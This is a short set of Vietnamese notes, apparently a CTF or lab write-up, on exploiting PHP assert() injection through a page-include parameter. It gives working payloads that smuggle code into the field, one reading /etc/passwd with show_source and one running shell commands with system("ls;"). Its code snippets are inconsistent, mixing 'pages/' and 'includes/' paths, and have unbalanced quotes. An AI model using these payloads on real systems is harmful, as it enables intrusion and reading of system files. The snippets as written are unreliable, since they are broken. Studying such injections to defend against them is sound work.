$file = "pages/" . $page . ".php";
assert(...$file...) or die("Detected hacking attempt!");
require_once $file;

Ví dụ bây giờ page là home thì dòng lệnh trên sẽ trở thành :

$file = "pages/" . $page . ".php";
assert(...$file...) or die("Detected hacking attempt!");
require_once $file;

========>     $file = "home.php";
              assert(strpos('includes/home.php,'..')===false);
              // hàm strpos('includes/home.php,'..') ở đây kiểm tra vị trị xuất hiện đầu tiên của chuỗi '..' trong chuỗi 
              assert(...$file...) or die("Detected hacking!);
              require_once $file;

              assert(strpos('includes'' and die(show_source('/etc/passwd')) or '.php,'..')===false)

              Nhưng mà nó vẫn bị die(system("ls;"))


giải thích một chút về hàm system sẽ thực hiện command ls ở trong nó và liệt kê chúng và hàm die(system("ls;")) sẽ in ra các kết quả của system("ls;")
 và injection như này 

 ' and die(system("ls;")) or ' 
 